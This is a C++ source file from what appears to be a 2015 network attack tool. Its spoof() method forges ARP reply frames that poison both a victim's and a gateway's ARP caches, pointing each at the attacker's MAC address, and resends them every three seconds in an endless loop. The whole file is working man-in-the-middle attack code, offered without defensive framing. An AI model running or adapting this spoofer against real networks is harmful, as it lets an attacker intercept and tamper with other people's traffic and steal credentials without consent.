/*
 * Spoofer.cpp
 *
 *  Created on: Apr 7, 2015
 *      Author: Felipe Rodopoulos
 */

#include "Spoofer.h"

Spoofer::Spoofer() {

}

Spoofer::~Spoofer() {

}

void Spoofer::spoof(){
	// Poisoned frame to victim
	Crafter toVictim(Globals::iface);
	toVictim.arp(
		ARPOP_REPLY,
		Globals::attacker.mac->ether_addr_octet, Globals::gateway.ip,
		Globals::victim.mac->ether_addr_octet, Globals::victim.ip
	);
	toVictim.ethernet(
		ETHERTYPE_ARP,
		Globals::gateway.mac->ether_addr_octet,
		Globals::victim.mac->ether_addr_octet
	);

	// Poisoned frame to gateway
	Crafter toGateway(Globals::iface);
	toGateway.arp(ARPOP_REPLY, Globals::attacker.mac->ether_addr_octet, Globals::victim.ip, Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip);
	toGateway.ethernet(ETHERTYPE_ARP, Globals::victim.mac->ether_addr_octet, Globals::gateway.mac->ether_addr_octet);

	// TODO Init thread
	while(true){
		toVictim.send();
		toGateway.send();
		sleep(3);
	}

}
